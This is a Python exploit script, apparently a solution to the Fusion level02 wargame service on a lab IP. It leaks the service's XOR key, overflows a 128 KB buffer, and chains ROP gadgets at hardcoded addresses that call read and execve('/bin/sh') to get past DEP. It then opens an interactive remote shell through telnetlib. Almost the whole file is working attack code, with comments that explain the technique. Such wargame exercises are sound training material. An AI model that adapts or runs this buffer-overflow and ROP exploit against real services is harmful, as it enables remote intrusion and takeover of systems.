PORT = 20002
FUSION_IP = "192.168.180.128"
import socket
import string
import telnetlib
import struct
import time
import select

#exploit:
# data is stored on a 4096*32 size buffer....
# I can write as much as I want on the buffer....
# buffer gets encrypted (XORED) with an unknown secret
# the encrypted buffer is sent ...
# I can read the buffer and send it again... so now my original buffer is stored on the stack (since ENC(ENC(X)) = X using the encryption)

# now in order to execute code I need to bypass DEP and ASLR.
# ASLR is not on the main module since it isn't PIC V
# ROP will be used to bypass DEP V

# ROP:
# find a ptr to a buffer on the main module...
# find /bin/sh on the main module... (the bytes can be found sperately)
### ^ maybe I can use read to get the data from the user :)
### ^ I can even copy the address of my buffer to another place so now I have ptr to my buffer :)

# copy all byte in the corret order to the buffer using memcpy()
# copy 4 NULLs to a location
# call execve() where the first arg is the buffer...
# the 2nd arg is ptr to the NULLs
# the 3rd arg is a ptr to the buffer...

# execv("/bin/sh",0,["/bin/sh"])

NOP = "\x90"
TRAP = "\xCC"
JMP_0x7f = '\xeb\x7f'

payload = NOP * 99 + TRAP + NOP * 400

BBBB            = 0xBBBBBBBB
DEAD            = 0xdeadbeef
NREAD           = 0x0804952d
EXECV           = 0x080489b0
#THIS ADDR SHOULDNT BE USED SINCE IT IS BEING CHANGED IN ASLR 
#EXECV2             = 0xb76c7a80#0xb76c8a80
ADD_ESP_0x230   = 0x08048f7f
SUB_ESP_0x230   = 0x08048c79
RW_SPACE        = 0x0804B48B # bss unused space... alignment -> determined with IDA
POP_EBP_RET     = 0x08049a08
LEAVE_RET       = 0x0804995c
POP4_RET        = 0x080499bc # found with objdump -d level02 | grep -A1 pop | grep -B1 ret
POP3_RET        = POP4_RET+1
POP2_RET        = POP4_RET+2
POP_RET         = POP4_RET+3

xor_strings = lambda x,y: ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(x,y))
to_addr = lambda x: struct.pack('<L', x)


s = socket.socket()
s.connect((FUSION_IP, PORT))
KEY = ""

def enc_data(buf_to_send, key):
    ret_val = xor_strings(buf_to_send, key + key * (len(buf_to_send) / len(key)))
    #print "encrypted data"
    return ret_val

def send_data(s, buf_to_send, timeout_for_buffer=1):
    
    buf_size = struct.pack('<L', len(buf_to_send))

    s.send('E' + buf_size + buf_to_send)
    #print "sending data..."
    time.sleep(timeout_for_buffer) 
    #print "sent!"
    buf = ''
    while len(buf) < 120 and select.select([s],[],[])[0]:
        buf += s.recv(120 - len(buf))

    #print "garbage:", buf
    if select.select([s],[],[])[0]:
        length = struct.unpack('<L', s.recv(4))[0]
        #print "length", length

    buf = ''
    while len(buf) < length and select.select([s],[],[])[0]:
        buf += s.recv(len(buf_to_send))
        #print repr(buf), len(buf)
    return buf

def read_garbage(s):
    buf = ''
    while len(buf) < 57 and select.select([s],[],[])[0]:
        buf += s.recv(57)
       #print buf, len(buf)

def exploit(s, ret_addr, add_args):
    global KEY
    read_garbage(s)
    print "garbage was read"
    KEY = key = send_data(s, '\x00' * 128, timeout_for_buffer=0.5)
    print "got key"
    buf_to_send = 'A' * (32*4096+16) + ret_addr + add_args
    send_data(s, enc_data(buf_to_send, key))

if __name__ == "__main__":

    data = to_addr(DEAD) + to_addr(EXECV) + to_addr(DEAD) + to_addr(RW_SPACE + 24) + to_addr(0) + to_addr(RW_SPACE + 12) + "/bin/sh\0"
    exploit(s, to_addr(NREAD),
        # Storing data on writeable location :)
        to_addr(POP3_RET) + to_addr(0) + to_addr(RW_SPACE) + to_addr(len(data))+ \
        # Now ebp will point to our buffer
        to_addr(POP_EBP_RET)+ to_addr(RW_SPACE)+ \
        # Now esp=> ebp and we are returning :)
        to_addr(LEAVE_RET)
        )
    #s.send('E' + '\0' * 4)
    print "sending Q to trigger the exploit"
    s.send('Q')
    s.send(data)

    print "starting remote shell"
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
#print s.recv(300) # reads data